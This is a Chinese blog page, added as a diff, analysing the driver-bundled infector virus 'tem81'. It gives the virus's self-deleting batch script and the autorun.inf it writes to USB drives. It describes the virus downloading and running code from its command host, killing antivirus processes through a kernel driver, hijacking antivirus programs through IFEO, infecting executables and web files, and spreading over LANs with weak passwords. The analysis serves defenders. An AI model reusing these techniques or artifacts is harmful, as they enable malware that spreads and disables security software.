@@ -1,0 +1,796 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+  <meta name="google-site-verification" content="i9ah5x5ODvKLpoCyNxyAxw8p0lbULKKLPS3IBF7_Guc" />
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
+
+
+    <meta name="description" content="水中月.镜中花.浮华一片苍凉.." />
+
+
+
+  <meta name="keywords" content="virus," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="idhyt's blog" type="application/atom+xml" />
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
+
+
+<meta name="description" content="一个附带驱动的感染型病毒tem81简略行为分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="病毒分析-驱动感染型">
+<meta property="og:url" content="http://blog.idhyt.xyz/2013/12/03/3-virus-infected-tem81/index.html">
+<meta property="og:site_name" content="idhyt's blog">
+<meta property="og:description" content="一个附带驱动的感染型病毒tem81简略行为分析">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-1.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-2.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-3.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-4.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-5.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-6.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-7.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-8.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-9.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-10.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-11.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-12.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-13.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-14.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-15.jpg">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-16.png">
+<meta property="og:updated_time" content="2015-09-20T14:47:19.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="病毒分析-驱动感染型">
+<meta name="twitter:description" content="一个附带驱动的感染型病毒tem81简略行为分析">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> 病毒分析-驱动感染型 | idhyt's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-61722826-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?5228d77c5752954f270fcca0908555af";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">风轻云淡</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br />
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br />
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br />
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-next-about"></i> <br />
+            关于
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <form class="site-search-form">
+    <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+  </form>
+
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'VpXUP87KQneoFZ3srxxA','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              病毒分析-驱动感染型
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2013-12-03T11:11:11+08:00" content="2013-12-03">
+            2013-12-03
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/逆向/" itemprop="url" rel="index">
+                  <span itemprop="name">逆向</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2013/12/03/3-virus-infected-tem81/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2013/12/03/3-virus-infected-tem81/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p>一个附带驱动的感染型病毒tem81简略行为分析<a id="more"></a></p>
+<h2 id="调试环境：">调试环境：</h2><p>Windows XP SP3, OD, IDA, 010Editor等</p>
+<h2 id="病毒简介">病毒简介</h2><p>病毒运行后会自我复制到被感染系统目录“%SystemRoot%\system32\dllcache\”文件夹下，重新命名为“systembox.bak”。<br>在“%SystemRoot%\system32\”和%SystemRoot%\system32\dllcache\”文件夹下释放经过加壳保护的恶意DLL组件“*.dll”（文件名从netsvcs服务组中依次取得，一般从“6to4”开始），<br>还会在“%SystemRoot%\system32\drivers\”文件夹下释放恶意驱动程“WmiSvc.sys”，用以结束大量安全软件的进程，<br>同时利用注册表映像文件劫持功能，干扰这些安全软件的正常运行。<br>另外注册自身为系统服务，以此实现开机自启，感染扩展名为“.exe”、“.asp”、“.htm”、“.html”、“.aspx”及“.RAR”文件，通过自带的密码表对存在弱口令的网络中其他计算机进行连接，一旦连接成功便会进行感染。</p>
+<h2 id="病毒运行过程">病毒运行过程</h2><h3 id="创建互斥事件检测自身是否运行">创建互斥事件检测自身是否运行</h3><p>1创建互斥事件4F9E860C-9BE9-474b-8FD1-F0EEDB20C77B。<br>2创建失败或者该互斥事件已经存在，标明病毒已经运行，则在临时目录下边生成一个批处理文件TempDel.bat，之后在里边写入数据<br>copy /Y “C:\Documents and Settings\Admin\桌面\tem81.exe” “”<br>:runagain<br>del “C:\Documents and Settings\Admin\桌面\tem81.exe”<br>if exist “C:\Documents and Settings\Admin\桌面\tem81.exe” goto runagain<br>del “C:\DOCUME~1\Admin\LOCALS~1\Temp\TempDel.bat”<br>3调用 ShellExecuteA执行，功能：删除自身，删除临时文件。<br>4最后退出进程。</p>
+<h3 id="检测病毒是否已注册服务项（举例AppMgmt说明）">检测病毒是否已注册服务项（举例AppMgmt说明）</h3><p>1调用函数OpenSCManagerA获得系统目录并建立一个连接到服务控制管理器并打开它的数据库。<br>2读取注册表HKEY_LOCAL_MACHINE下”SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost”键名为netsvcs的所有值到缓冲区。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-1.png" alt=""><br>netsvcs 就是网络服务，要开启共享是必须有这个服务的。<br>3遍历注册表HKEY_LOCAL_MACHINE下”SYSTEM\CurrentControlSet\Services\%s\Parameters”子键，其中%s为netsvcs的值，从6to4开始。<br>4找到该目录下找到键名为ServiceDLL的键值%SystemRoot%\System32\appmgmts.dll<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-2.png" alt=""><br>5判断该键值%SystemRoot%\System32\appmgmts.dll是否和病毒本身相同（病毒会在6to4下边注册一个键名为serviceDll.dll变量值为C:\WINDOWS\system32\6to4.dll的子键）。<br>6如过找到了说明病毒已经运行了该注册的服务项。调用函数ControlService终止该服务。<br>7如果没有找到该键值，则去创建该键值，创建过程如下：</p>
+<h3 id="创建病毒运行服务项（举例6to4-dll说明）">创建病毒运行服务项（举例6to4.dll说明）</h3><p>1调用函数CreateServiceA 循环创建服务名为6to4（数据库中从6to4开始）服务程序二进制文件的路径为”%SystemRoot%\System32\svchost.exe -k netsvcs”可被多个进程共享的自动动服务程序，并且把它加入到服务管理数据库中。<br>2调用函数PathFileExistsA检测C:\windows\system32\6to4.dll文件是否存在<br>3如果不存在则关闭系统保护创建该文件。如果存在则直接打开。</p>
+<p>4关闭系统保护方法：<br>4.1获取系统信息，如果系统次版本号为2，加载sfc_os.dll，否则加载sfc.dll。<br>4.2调用函数MultiByteToWideChar路径转为宽字节路径<br>4.3加载sfc.dll，全称为system file cheak(系统文件检查)，获取#5函数地址。<br>4.4调用#5号api，它的作用是关闭系统文件保护60秒。</p>
+<p>5如果遍历完数据库中所有服务项都创建失败，则进行如下步骤<br>5.1从WmdmPmSN，AppMgmt，Ntmssvc，Rasauto，BITS，Browser，ERSvc<br>其中一个服务里边创建服务项。举例释放到组建WmdmPmSN中说明：<br>5.2调用函数OpenServiceA打开服务项MsPMSNSv。<br>5.3调用函数 QueryServiceStatus获取服务MsPMSNSv运行状态。<br>5.4如果在运行则通过函数ControlService关闭它<br>5.5创建病毒运行服务项，同步骤0x3<br>5.6 释放被感染的DLL组建system32和dllcache下，同步骤0x4<br>5.7调用StartServiceA函数开启该服务项。<br>5.8重新运行自删除，同0x6</p>
+<h3 id="生成dll服务,释放DLL组建">生成dll服务,释放DLL组建</h3><p>1调用函数PathFileExistsA检测C:\windows\system32\6to4.dll文件是否存在，<br>如果不存在则关闭系统保护创建该文件。如果存在则直接打开。<br>2调用函数GetFileTime获取文件操作信息（创建，访问，修改）<br>3之后将偏移0xC048处0x4C00大小的资源数据写入6to4.dll文件中。<br>4通过函数SetFileTime设置文件操作时间为写入数据之前。<br>5重复步骤1–4将6to4.dll写入C:\WINDOWS\system32\dllcache\目录下。<br>6释放资源文件。</p>
+<h3 id="增加新的服务注册表项实现服务自启动">增加新的服务注册表项实现服务自启动</h3><p>1调用函数RegOpenKeyExA打开注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\6to4<br>2调用函数RegCreateKeyExA创建名为Parameters的新子键<br>3在该子键下注册一个新键，键名为serviceDll.dll变量值为C:\WINDOWS\system32\6to4.dll<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-3.jpg" alt=""></p>
+<h3 id="开启服务，自删除">开启服务，自删除</h3><p>1调用StartServiceA函数开启6to4服务，运行6to4.dll。<br>2临时目录下生成TempDel.bat文件，写入数据：</p>
+<pre><code>copy /Y "C:<span class="command">\Documents</span> and Settings<span class="command">\Admin</span><span class="command">\桌</span>面<span class="command">\tem</span>81.exe" "C:<span class="command">\WINDOWS</span><span class="command">\system</span>32<span class="command">\dllcache</span><span class="command">\systembox</span>.bak"
+:runagain
+del "C:<span class="command">\Documents</span> and Settings<span class="command">\Admin</span><span class="command">\桌</span>面<span class="command">\tem</span>81.exe"
+if exist "C:<span class="command">\Documents</span> and Settings<span class="command">\Admin</span><span class="command">\桌</span>面<span class="command">\tem</span>81.exe" goto runagain
+del "C:<span class="command">\DOCUME</span><span class="special">~</span>1<span class="command">\Admin</span><span class="command">\LOCALS</span><span class="special">~</span>1<span class="command">\Temp</span><span class="command">\TempDel</span>.bat"
+</code></pre><p>3调用 ShellExecuteA执行。<br>4 TempDel.bat功能：<br>4.1将病毒拷贝到C:\WINDOWS\system32\dllcache\systembox.bak重新运行<br>4.2删除自身<br>4.3检测自身是否存在 如果存在继续删除<br>4.4最后删除临时文件。<br>5退出进程。</p>
+<h2 id="释放的DLL文件分析">释放的DLL文件分析</h2><h3 id="检测自身是否运行">检测自身是否运行</h3><p>1调用函数CreateEventA创建互斥事件4F9E860C-9BE9-474b-8FD1-F0EEDB20C77B<br>2如果创建失败或者互斥事件已经存在，则退出进程。</p>
+<h3 id="解密URL">解密URL</h3><p>1从偏移0x8488处开始的0x20个字节，先减1再与0xA5异或，即 <em>i = (</em>i - 1) ^ 0xA5;得到URL 地址：<a href="http://www.dy2004.com/msn/mm.txt" target="_blank" rel="external">http://www.dy2004.com/msn/mm.txt</a><br>2从偏移0x8518处开始的0x21字节开始，如果等于0x2C则置0，否则不变，即 if ( <em>k == 0x2C )  </em>k = 0;得到字符串n.Administrator.Guest.admin.Root<br>3从偏移0x8540处开始的0x26C字节开始，同2的方法相同，得到弱口令数据块。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-4.jpg" alt=""><br>4从偏移0x87B0处开始，如果等于0x2C或0x7C则置0，否则不变，解密出杀毒软件进程名数据块<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-5.jpg" alt=""></p>
+<h3 id="创建线程0x10003F33访问指定的链接">创建线程0x10003F33访问指定的链接</h3><p>1建立socket链接，访问www.dy2004.com<br>2判断要打开的链接是HTM网页还是ASP网页<br>3如果是htm网页，创建死循环，2分钟循环一次，调用函数ShellExecuteExA用IE打开链接<a href="http://www.dy2004.com/msn/mm.htm，打开成功，延时30秒退出线程。" target="_blank" rel="external">http://www.dy2004.com/msn/mm.htm，打开成功，延时30秒退出线程。</a><br>4如果是ASP网页，则获取计算机名字，建立socket链接，调用send函数向<a href="http://www.dy2004.com/msn/mm.asp:50发送数据" target="_blank" rel="external">http://www.dy2004.com/msn/mm.asp:50发送数据</a><br>GET /msn/mm.htm?name=TEST-D43880C7BB HTTP/1.1..User-Agent: Mozil<br>0006EE98  la/4.0..Host: www.dy2004.com.</p>
+<h3 id="创建线程0x100018d7下载恶意文件并执行">创建线程0x100018d7下载恶意文件并执行</h3><p>1调用函数urlmon.URLDownloadToFileA从<a href="http://www.dy2004.com/msn/mm.txt下载数据到临时文件目录C:\DOCUME~1\Admin\LOCALS~1\Temp\下的TempLocal.txt文件中。" target="_blank" rel="external">http://www.dy2004.com/msn/mm.txt下载数据到临时文件目录C:\DOCUME~1\Admin\LOCALS~1\Temp\下的TempLocal.txt文件中。</a><br>2通过 GetUrlCacheEntryInfoA获得本地缓存文件地址，然后将缓存文件删除。<br>3获取TempLocal.txt文件大小size，之后申请一个size+0x20大小的对象。<br>4将TempLocal.txt数据读取到对象中，删除TempLocal.txt<br>5在对象中进行特殊字符查找，最终生成一个URL链接和一个文件名，之后调用函数URLDownloadToFileA继续从该链接下载指定的文件。<br>6检测下载的文件是否存在，之后创建一个以该文件命名的具有IE进程权限的用户进程，如果创建失败，则调用ShellExecuteA直接打开。</p>
+<h3 id="创建线程0x10003A8D注册驱动服务，终止杀软进行">创建线程0x10003A8D注册驱动服务，终止杀软进行</h3><p>1打开驱动服务NtBox。<br>2打开失败则注册该驱动服务。<br>3 打开C:\WINDOWS\system32\drivers\WmiSvc.sys.<br>4加载偏移0xA070处0xD00的资源到内存。将该数据写入WmiSvc.sys文件中。<br>5调用函数PathFileExistsA验证文件是否存在.<br>6调用CreateServiceA生成WmiSvc服务项，调用StartServiceA开启该服务项。<br>7重新打开驱动服务NtBox，获得驱动句柄hDevice<br>8创建死循环遍历系统进程，2秒循环一次，找到除avp.exe之外的所有杀毒软件进程，调用函数DeviceIoControl想驱动服务发送请求，终止杀软进程。</p>
+<pre><code>DeviceIoControl参数如下：
+<span class="number">0006F</span>3B8   <span class="number">000000</span>B0  |hDevice = <span class="number">000000</span>B0 (window) <span class="comment">//WmiSvc.sys驱动服务中NtBox句柄</span>
+<span class="number">0006F</span>3BC   <span class="number">00222008</span>  |IoControlCode = <span class="number">222008</span>
+<span class="number">0006F</span>3C0   <span class="number">0006F</span>3D8  |InBuffer = <span class="number">0006F</span>3D8   <span class="comment">//存放杀软进程ID</span>
+<span class="number">0006F</span>3C4   <span class="number">00000004</span>  |InBufferSize = <span class="number">4</span>
+<span class="number">0006F</span>3C8   <span class="number">00000000</span>  |OutBuffer = <span class="literal">NULL</span>
+<span class="number">0006F</span>3CC   <span class="number">00000000</span>  |OutBufferSize = <span class="number">0</span>
+<span class="number">0006F</span>3D0   <span class="number">0006F</span>3DC  |pBytesReturned = <span class="number">0006F</span>3DC
+<span class="number">0006F</span>3D4   <span class="number">00000000</span>  \pOverlapped = <span class="literal">NULL</span>
+</code></pre><p>9驱动服务WmiSvc.sys终止杀软进程功能实现：<br>9.1将欲结束的进程PID传递到内核驱动WmiSvc.sys，驱动通过IoControlCode 找到派遣功能<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-6.jpg" alt=""><br>9.2读取IRP结构中+0xC处为AssociatedIrp，AssociatedIrp+0xC处的SystemBuffer中应用层传输的数据，即进程ID<br>9.3驱动通过函数 PsLookupProcessByProcessId得到进程的EPROCESS结构<br>调试中返回指针为0x863005d0，在windbg输入命令验证：<br>kd&gt; !process 0 0<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-7.jpg" alt=""><br>4通过EPROCESS结构偏移0x190处找到线程的链表头,该链表中存放ThreadListEntry，之后将ThreadListEntry-0x22C得到该线程的ETHREAD结构地址。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-8.jpg" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-9.jpg" alt=""><br>5遍历这个链表，调用PspTerminateThreadByPointer将杀软线程全部杀掉，之后杀软进程便会退出。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-10.png" alt=""></p>
+<h3 id="创建线程0x10004618利用注册表映像文件劫持功能干扰杀软正常运行">创建线程0x10004618利用注册表映像文件劫持功能干扰杀软正常运行</h3><p>1通过GetNamedSecurityInfoA，BuildExplicitAccessWithNameA，SetEntriesInAclA，SetNamedSecurityInfoA函数为注册表MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options重建一个新的访问控制列表<br>2在注册表SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下创建杀毒软件进程名字的子项<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-11.png" alt=""><br>3之后在该子项下生成一个键名为Debugger键值为ntsd -d的子键。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-12.jpg" alt=""><br>4 ntsd为系统自带的进程调试工具，这样杀软运行时会自动打开系统调试器，从而干扰了杀软的正常工作。</p>
+<h3 id="劫持host，自保护">劫持host，自保护</h3><p>1.循环获取系统运行时间，判断是否大于3分钟，如果不大于，则延时1秒，如果大于，则继续执行。<br>2.打开C:\WINDOWS\system32\drivers\etc\目录下hosts文件，覆盖写入<br>127.0.0.1       localhost.<br>3.检测病毒母体文件C:\WINDOWS\system32\dllcache\systembox.bak是否存在。<br>4.调用函数CreateFileMappingA将母体映射到内存中。</p>
+<h3 id="创建线程0x1000311F感染系统文件">创建线程0x1000311F感染系统文件</h3><p>1创建互斥事件94A7A7DA-6D69-472e-8981-DBC71C77FC66和207C6A67-5861-4aaf-A336-C255C7AE4C57<br>2调用函数GetLogicalDriveStringsA获系统所有磁盘。<br>3调用函数GetDriveTypeA获取磁盘类型<br>4非A:\和B:\进行感染。</p>
+<h4 id="感染exe文件">感染exe文件</h4><p>1调用函数WinVerifyTrust验证数字签名6B C5 AA 00 44 CD D0 11 8C C2 00 C0 4F C2 95 EE 10 00 00 00  （验证失败）<br>2调用GetFileTime获取文件时间信息。<br>3将待感染的exe文件映射到内存。对PE格式进行检测，然后添加新节为可写代码段，块数目加1<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-13.jpg" alt=""><br>4在PE最后写入偏移0x6450处大小为0x1F7字节的数据。<br>5将0x5C00大小的病毒母体文件拷贝到后边。<br>6最后将病毒母体的MZ头四个字节改为其本身大小0x5C00<br>7调用函数SetFileTime设置文件时间信息为感染之前<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-14.png" alt=""><br>8当受感染的PE文件运行，感染的前0x1F7的代码用于病毒母体进行重定位修复IAT等操作，之后病毒母体得以正确运行。</p>
+<h4 id="感染htm\html\asp\aspx">感染htm\html\asp\aspx</h4><p>1调用GetFileTime获取文件时间信息。<br>2读取htm文件最后256个字节，查找字符串“&lt;iframe”，如果找到了说明已经感染过，则不感染，找不到则进行感染。<br>3之后在最后写入感染代码。<br>4调用SetFileTime设置文件时间信息为感染之前。</p>
+<h4 id="感染RAR文件">感染RAR文件</h4><p>创建感染线程0x1000269E，以感染test.rar为例说明<br>1找到C:\Program Files\WinRAR目录下的rar.exe，调用函数PathFileExistsA检测该文件是否存在，如果存在则进行感染。<br>2获取待感染test.rar文件大小，如果大于等于0x2800小于等于0xA00000则进行感染。<br>3调用GetFileTime获取文件时间信息。<br>4 生成字符串C:\Program Files\WinRAR\Rar.exe X -ibck “c:\test.rar” “C:\DOCUME~1\Admin\LOCALS~1\Temp\test\”<br>5将字符串作为函数CreateProcessA参数将文件解压至系统临时目录下与待感染文件同名的文件夹下边。<br>6调用PathFileExistsA检测解压文件夹是否存在。<br>7删除原始待感染文件。<br>8 创建感染线程（0x1000262c）去感染PE文件和htm等，目的是为了感染解压过的文件。<br>9 生成字符串C:\Program Files\WinRAR\Rar.exe M -ibck -r -o+ -ep1 “c:\test.rar” “C:\DOCUME~1\Admin\LOCALS~1\Temp\test*“<br>10将字符串作为函数CreateProcessA参数将临时文件下被感染过的文件夹压缩到原来的系统目录下。<br>11调用SetFileTime设置文件时间信息为感染之前。<br>12调用函数RemoveDirectoryA删除临时文件目录下生成的test文件夹。</p>
+<h4 id="感染局域网">感染局域网</h4><p>创建线程0x10005265感染终端服务器文件，局域网和Internet<br>1 加密URL <a href="http://www.dy2004.com/msn/mm.exe" target="_blank" rel="external">http://www.dy2004.com/msn/mm.exe</a> 异或0xF7<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-15.jpg" alt=""><br>2通过使用WNetOpenEnum函数获得所有网络资源的信息过程，使用WNetEnumResource函数获取所有网络信息，之后在终端服务器上创建文件Microsoft Terminal Services\desktop.txt测试对终端服务器是否具有访问权限。<br>3如果具有访问权限，则删除该文件，调用感染线程对终端服务器的文件进行感染。感染过程同感染线程0x1000311F<br>4最后使用WNetCloseEnum函数结束枚举网络资源的过程。<br>感染局域网<br>5通过函数WNetAddConnection2A连接到同网段中的其他IP地址，如果需要账户密码，则从解密出来的账户和弱口令进行配置，之后调用CopyFile函数将C:\WINDOWS\system32\dllcache\systembox.bak病毒母体拷贝到目标机器C盘上并命名为bootfont.exe<br>6调用函数Winexec隐藏运行目标机器上的bootfont.exe对目标机器进行感染。<br>7最后调用WNetCancelConnection2A关闭链接。<br>感染非局域网（Ineternet）<br>8通过函数WNetAddConnection2A与其他网段IP建立pipe管道，之后打开命名管道\pipe\browser，如果需要账户密码，则从解密出来的账户和弱口令进行配置，<br>之后通过TransactNamedPipe函数通过管道传输感染数据到目标机器。</p>
+<h4 id="感染可移动磁盘">感染可移动磁盘</h4><p>创建线程0x100058E1感染可移动磁盘<br>1调用函数GetLogicalDrives和GetDriveTypeA获取磁盘和磁盘类型，如果是可移动磁盘则进行感染。<br>2 调用函数PathFileExistsA查看可移动磁盘根目录下是否存在autorun.inf文件，如果不存在则创建。<br>3 创建成功后写入0x138字节的数据，实现自启动。</p>
+<pre><code><span class="special">[</span>autorun<span class="special">]</span>
+OPEN=recycle.<span class="special">{</span>645FF040-5081-101B-9F08-00AA002F954E<span class="special">}</span><span class="command">\Ghost</span>.exe
+shell<span class="command">\open</span>=打开(<span class="special">&amp;</span>O)
+shell<span class="command">\open</span><span class="command">\Command</span>=recycle.<span class="special">{</span>645FF040-5081-101B-9F08-00AA002F954E<span class="special">}</span><span class="command">\Ghost</span>.exe Bak
+shell<span class="command">\open</span><span class="command">\Default</span>=<span class="number">1</span>
+shell<span class="command">\explore</span>=资源管理器(<span class="special">&amp;</span>X)
+shell<span class="command">\explore</span><span class="command">\Command</span>=recycle.<span class="special">{</span>645FF040-5081-101B-9F08-00AA002F954E<span class="special">}</span><span class="command">\Ghost</span>.exe Bak
+</code></pre><p>3在可移动磁根目录下创建目录recycle.{645FF040-5081-101B-9F08-00AA002F954E}并调用函数PathFileExistsA检测是否创建成功。<br>4将C:\WINDOWS\system32\dllcache\systembox.bak病毒母体拷贝到新建的目录recycle.{645FF040-5081-101B-9F08-00AA002F954E}下，并命名为Ghost.exe<br>5调用函数SetFileAttributesA将Ghost.exe和autorun.inf设置为READONLY|HIDDEN|SYSTEM属性。<br>至此可移动磁盘感染完成。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-tem81-16.png" alt=""></p>
+<h3 id="创建线程0x10005ACB下载恶意文件并运行">创建线程0x10005ACB下载恶意文件并运行</h3><p>1从<a href="http://www.dy2004.com/msn/mm.txt下载Newtemp_387.exe到临时文件目录C:\DOCUME~1\Admin\LOCALS~1\Temp\下。过程同线程0x100018d7前四步" target="_blank" rel="external">http://www.dy2004.com/msn/mm.txt下载Newtemp_387.exe到临时文件目录C:\DOCUME~1\Admin\LOCALS~1\Temp\下。过程同线程0x100018d7前四步</a>.<br>2对下载文件做一些字符串检验，读取头两字节内容判断是否为MZ头，检验过后创建线程0x10005ACB<br>3将自身dll文件目录（6to4.dll）作为参数传递给函数CreateProcessA创建进程Newtemp_387.exe<br>4枚举当前进程所有线程，找到自身线程调用函数TerminateThread将其终止。<br>5调用函数UnmapViewOfFile释放之前映射的母体对象，删除C:\WINDOWS\system32\dllcache目录下的systembox.bak（病毒母体）文件。<br>6退出线程，释放互斥事件等收尾工作。</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/virus/" rel="tag">#virus</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2013/12/19/3-virus-troj-mutil/" rel="prev">病毒分析-多功能盗号木马</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2013/11/29/3-virus-infected-word/" rel="next">病毒分析-宏感染型</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <div class="ds-share flat" data-thread-key="2013/12/03/3-virus-infected-tem81/"
+     data-title="病毒分析-驱动感染型"
+     data-content=""
+     data-url="http://blog.idhyt.xyz/2013/12/03/3-virus-infected-tem81/">
+  <div class="ds-share-inline">
+    <ul  class="ds-share-icons-16">
+
